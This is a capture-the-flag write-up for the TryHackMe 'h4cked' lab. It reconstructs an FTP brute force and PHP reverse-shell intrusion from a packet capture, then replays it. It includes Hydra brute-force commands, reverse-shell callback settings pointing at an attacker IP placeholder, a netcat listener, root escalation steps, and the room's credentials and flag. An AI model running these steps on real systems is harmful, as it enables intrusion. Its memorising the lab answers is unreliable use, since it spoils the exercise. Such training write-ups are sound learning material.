---
title: h4cked
summary: TryHackMe room using a packet capture to reconstruct an FTP compromise, identify the attacker's web shell path, then replay the intrusion to recover the root flag.
date: 2026-07-03
tags: [TryHackMe, PCAP, Wireshark, FTP, Web Shell, Rootkit, Purple Team]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/h4cked
---

# CTF Room: h4cked
- [Link to room](https://tryhackme.com/room/h4cked)
- **Difficulty:** Easy
- **Category:** PCAP Analysis, FTP Brute Force, Web Shell, Privilege Escalation, Purple Team
- **OS:** Linux

## 1. Brief
h4cked starts as a packet capture investigation and then turns into a replay exercise. First, I used Wireshark to work out how the attacker got in. After that, I copied the same rough attack chain against the live box to read the flag.

Tools used:

- Wireshark
- Nmap
- Hydra
- FTP
- Netcat

## 2. PCAP Triage
I started by opening the provided `.pcap` in Wireshark and checking the traffic patterns. Port `21` traffic stood out, and the packet stream showed a brute-force style login attempt against FTP.

Useful filters for this room:

```text
ftp
tcp.port == 21
ftp.request.command == "USER" || ftp.request.command == "PASS"
ftp.request.command == "PWD" || ftp.request.command == "STOR"
```

The service was:

```text
||FTP||
```

The brute-force tool name was:

```text
||Hydra||
```

The attacker focused on this username:

```text
||Jenny||
```

Packet `394` gave the password attempt in cleartext:

```text
Request: PASS ||password123||
```

A few packets later, the server confirmed the working directory after login:

```text
Response: 257 "||/var/www/html||" is the current directory
```

That path matters because it means FTP access also gives write access to the web root. Not ideal.

## 3. Uploaded Backdoor
I filtered around the FTP `STOR` command and found the attacker uploading a PHP shell.

```text
Request: STOR ||shell.php||
```

Opening the uploaded file content showed the source URL for the shell:

```text
||http://pentestmonkey.net/tools/php-reverse-shell||
```

That explains the next phase. The attacker wrote a PHP reverse shell into the web root, then triggered it through the browser.

## 4. Reverse Shell Activity
Following TCP stream `20` showed the commands run after the attacker caught the shell.

The first manual command was:

```bash
||whoami||
```

The hostname was:

```text
||wir3||
```

The attacker then upgraded the shell with Python:

```bash
||python3 -c 'import pty; pty.spawn("/bin/bash")'||
```

After that, they moved to root:

```bash
||sudo su||
```

The GitHub project they downloaded was:

```text
||Reptile||
```

Reptile is a Linux kernel rootkit, so the backdoor type is:

```text
||rootkit||
```

## 5. Replaying The Attack
Task 2 asks us to hack back into the live machine. The attacker changed Jenny's password, so the password from the PCAP is useful context but not the final login.

I started with a full port scan to confirm the exposed services:

```bash
nmap -A -T4 -Pn -p- <TARGET_IP>
```

The important result for this path is FTP. Once I knew FTP was open, I ran Hydra against Jenny with `rockyou.txt`:

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

Hydra recovered the live FTP password:

```text
||987654321||
```

After logging in, I pulled down the web shell, changed the callback IP and port, and uploaded it back into the web root.

```bash
ftp <TARGET_IP>
```

Inside the FTP session:

```text
Name: ||jenny||
Password: ||987654321||
ftp> get shell.php
ftp> put shell.php
```

The PHP reverse shell needs your AttackBox or VPN IP. If you are using OpenVPN, use the `tun0` address:

```bash
ifconfig tun0
```

Then update the listener values in `shell.php`:

```php
$ip = '<ATTACKER_IP>';
$port = 4444;
```

With the shell uploaded, I started a listener before triggering it:

```bash
nc -lvnp 4444
```

Then I triggered the shell from the browser:

```http
http://<TARGET_IP>/shell.php
```

Once the reverse shell connected, I upgraded the TTY and used the same privilege escalation path from the packet capture.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
sudo su
```

From there, the flag lives in the Reptile directory:

```bash
cd /root/Reptile
cat flag.txt
```

### Flag
```text
||ebcefd66ca4b559d17b440b6e67fd0fd||
```

## 6. Summary
This room is a tidy reminder that PCAPs can hand you the whole intrusion path if the protocol is cleartext. FTP gave away the username, password, working directory, uploaded shell name, and enough of the reverse shell session to replay the attack.

The recovery phase then became a controlled repeat: brute-force the changed FTP password, upload the PHP shell, catch the callback, use `sudo su`, and read the flag from `/root/Reptile`.
